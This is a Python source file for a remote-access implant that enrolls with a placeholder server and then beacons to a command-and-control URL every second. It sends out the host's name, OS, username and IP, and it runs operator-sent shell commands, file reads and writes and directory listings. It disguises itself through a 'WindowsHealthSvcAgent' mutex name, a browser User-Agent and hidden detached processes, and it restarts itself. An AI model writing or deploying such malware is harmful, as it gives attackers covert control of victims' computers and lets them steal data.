import hashlib
import hmac as _hmac_mod
import json
import os
import platform
import random
import socket
import string
import subprocess
import sys
import threading
import time
import traceback
import urllib.request
import urllib.error

INIT_URL        = "https://init-yourid.yourdomain.com/init"
ENROLL_KEY      = "your-enroll-key-here"
BEACON_INTERVAL = 1
BEACON_TIMEOUT  = 25
MAX_BACKOFF     = 60

_VPS_URL = None
_SECRET  = None

HERE    = os.path.dirname(os.path.abspath(__file__))
ID_FILE = os.path.join(HERE, ".agent_id")
LOG     = os.path.join(HERE, "svc.log")

if platform.system() == "Windows":
    import ctypes
    _MUTEX_NAME = "Global\\WindowsHealthSvcAgent"
    _mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:
        sys.exit(0)
else:
    import fcntl
    _lock_file = open("/tmp/.agent.lock", "w")
    try:
        fcntl.flock(_lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except IOError:
        sys.exit(0)


def _get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return socket.gethostbyname(socket.gethostname())


def _get_username():
    for var in ("USERNAME", "USER", "LOGNAME"):
        v = os.environ.get(var, "").strip()
        if v:
            return v
    if platform.system() != "Windows":
        try:
            import pwd
            return pwd.getpwuid(os.getuid()).pw_name
        except Exception:
            pass
    try:
        r = subprocess.run(["whoami"], capture_output=True, text=True, timeout=5)
        u = r.stdout.strip()
        if u:
            return u
    except Exception:
        pass
    return "unknown"


def _log(msg):
    try:
        with open(LOG, "a") as f:
            f.write(f"{time.strftime('%H:%M:%S')} {msg}\n")
    except Exception:
        pass


def _load_agent_id():
    if os.path.exists(ID_FILE):
        v = open(ID_FILE).read().strip()
        if v:
            return v
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    aid = f"{socket.gethostname().lower()}-sys-{suffix}"
    open(ID_FILE, "w").write(aid)
    return aid


AGENT_ID = _load_agent_id()


def _http_post(url, body):
    data = json.dumps(body).encode()
    req  = urllib.request.Request(url, data=data, headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }, method="POST")
    with urllib.request.urlopen(req, timeout=BEACON_TIMEOUT) as r:
        return json.loads(r.read())


def _get_c2_config(agent_id):
    token   = _hmac_mod.new(ENROLL_KEY.encode(), agent_id.encode(), hashlib.sha256).hexdigest()
    backoff = 5
    while True:
        try:
            resp = _http_post(INIT_URL, {"agent_id": agent_id, "token": token})
            return resp["c2_url"], resp["secret"]
        except Exception as e:
            _log(f"init error: {e}")
            time.sleep(backoff)
            backoff = min(backoff * 2, 60)


def _run_shell(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=timeout, errors="replace")
        out = r.stdout
        if r.stderr:
            out += "\n[stderr]\n" + r.stderr
        return {"output": out.strip(), "exit_code": r.returncode}
    except subprocess.TimeoutExpired:
        return {"output": f"timed out after {timeout}s", "exit_code": -1}
    except Exception as e:
        return {"output": str(e), "exit_code": -1}


def _launch_detached(cmd):
    try:
        kwargs = dict(shell=True, stdin=subprocess.DEVNULL,
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if platform.system() == "Windows":
            kwargs["creationflags"] = 0x00000008 | 0x00000200 | 0x08000000
        else:
            kwargs["start_new_session"] = True
        subprocess.Popen(cmd, **kwargs)
        return {"output": "launched (detached)", "exit_code": 0}
    except Exception as e:
        return {"output": str(e), "exit_code": -1}


def _read_file(path):
    try:
        return {"output": open(path, errors="replace").read(), "exit_code": 0}
    except Exception as e:
        return {"output": str(e), "exit_code": 1}


def _write_file(path, content):
    try:
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        open(path, "w", errors="replace").write(content)
        return {"output": f"Written {len(content)} bytes to {path}", "exit_code": 0}
    except Exception as e:
        return {"output": str(e), "exit_code": 1}


def _list_dir(path="."):
    try:
        entries = sorted(os.listdir(path))
        lines = [("DIR " if os.path.isdir(os.path.join(path, e)) else "FILE") + "  " + e
                 for e in entries]
        return {"output": "\n".join(lines) or "(empty)", "exit_code": 0}
    except Exception as e:
        return {"output": str(e), "exit_code": 1}


def _restart_self():
    self_path = os.path.abspath(__file__)
    exe       = sys.executable
    if platform.system() == "Windows":
        helper = os.path.join(os.environ.get("TEMP", HERE), "_agent_restart.py")
        with open(helper, "w") as f:
            f.write(
                f"import time, subprocess, sys\n"
                f"time.sleep(2)\n"
                f"subprocess.Popen(\n"
                f"    [r'{exe}', r'{self_path}'],\n"
                f"    creationflags=0x00000008|0x00000200|0x08000000,\n"
                f"    close_fds=True)\n"
            )
        _launch_detached(f'"{exe}" "{helper}"')
    else:
        try:
            subprocess.Popen(["systemctl", "restart", "agent"],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            _launch_detached(f'"{exe}" "{self_path}"')
    time.sleep(0.5)
    sys.exit(0)


def handle_task(task):
    t = task.get("type")
    try:
        p = json.loads(task.get("payload", "{}"))
    except Exception:
        p = {}
    if t == "shell":
        return _run_shell(p.get("command", ""), p.get("timeout", 30))
    if t == "launch":
        return _launch_detached(p.get("command", ""))
    if t == "read_file":
        return _read_file(p.get("path", ""))
    if t == "write_file":
        return _write_file(p.get("path", ""), p.get("content", ""))
    if t == "list_dir":
        return _list_dir(p.get("path", "."))
    if t == "shutdown":
        sys.exit(0)
    if t == "restart":
        return _restart_self()
    return {"output": f"unknown task: {t}", "exit_code": 1}


def _run_task_thread(task):
    result = handle_task(task)
    with _results_lock:
        _pending_results.append({"task_id": task["task_id"], **result})
    _results_ready.set()


_results_lock    = threading.Lock()
_pending_results = []
_results_ready   = threading.Event()


def beacon(results):
    body = json.dumps({
        "secret":   _SECRET,
        "agent_id": AGENT_ID,
        "hostname": socket.gethostname(),
        "os":       f"{platform.system()} {platform.release()}",
        "username": _get_username(),
        "ip":       _get_local_ip(),
        "results":  results,
    }).encode()
    req = urllib.request.Request(
        _VPS_URL + "/c2/beacon",
        data=body,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
    )
    with urllib.request.urlopen(req, timeout=BEACON_TIMEOUT) as r:
        return json.loads(r.read())


def main():
    global _VPS_URL, _SECRET
    _log(f"starting as {AGENT_ID}")
    _VPS_URL, _SECRET = _get_c2_config(AGENT_ID)
    _log(f"enrolled, beaconing to {_VPS_URL}")
    backoff = BEACON_INTERVAL
    while True:
        with _results_lock:
            results = list(_pending_results)
            _pending_results.clear()
        try:
            resp    = beacon(results)
            backoff = BEACON_INTERVAL
            tasks   = resp.get("tasks", [])
            for task in tasks:
                threading.Thread(target=_run_task_thread, args=(task,), daemon=True).start()
            if tasks:
                _results_ready.wait(timeout=30)
                _results_ready.clear()
            else:
                time.sleep(BEACON_INTERVAL)
        except SystemExit:
            break
        except urllib.error.HTTPError as e:
            if e.code in (401, 403):
                _log("beacon auth rejected, re-enrolling...")
                try:
                    _VPS_URL, _SECRET = _get_c2_config(AGENT_ID)
                    _log("re-enrolled successfully")
                    backoff = BEACON_INTERVAL
                except Exception as re:
                    _log(f"re-enroll failed: {re}")
                    time.sleep(backoff)
                    backoff = min(backoff * 2, MAX_BACKOFF)
            else:
                _log(f"beacon http error: {e}\n{traceback.format_exc()}")
                with _results_lock:
                    _pending_results[:0] = results
                time.sleep(backoff)
                backoff = min(backoff * 2, MAX_BACKOFF)
        except BaseException as e:
            _log(f"beacon error: {type(e).__name__}: {e}\n{traceback.format_exc()}")
            with _results_lock:
                _pending_results[:0] = results
            if isinstance(e, (KeyboardInterrupt, SystemExit)):
                break
            time.sleep(backoff)
            backoff = min(backoff * 2, MAX_BACKOFF)


if __name__ == "__main__":
    main()
